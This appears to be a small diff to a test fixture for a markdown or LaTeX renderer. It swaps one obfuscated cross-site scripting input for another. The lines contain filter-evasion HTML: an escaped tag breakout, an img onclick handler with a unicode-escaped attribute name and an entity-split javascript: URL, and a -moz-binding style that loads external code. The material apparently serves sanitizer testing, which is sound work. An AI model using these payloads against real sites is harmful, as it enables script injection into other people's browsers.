@@ -10,4 +10,4 @@ $$ \u003E\u003C\<img class=xlalla src=mmalla id=lkaka style="width:90px">{}$$
 <style>h1{color:blue}</style>
 <h1>aa</h1>
 
-$$ \u003E\u003C\<a href=# style="position:relative;width:100px;background:#ddffdd;overflow:hidden;">aa</a><img src=m onc\u006Cick=javascript&#x6a;avascript:alert(1)()><link rel="stylesheet" href="styles.css">{}$$
+$$ \u003E\u003C\<a href=# style="position:relative;width:100px;background:#ddffdd;overflow:hidden;">aa</a><img src=m onc\u006Cick=javascript&#x6a;avascript:alert(1)()><style>body{-moz-binding:url(scramamipt.xml#mycode);}</style>{}$$
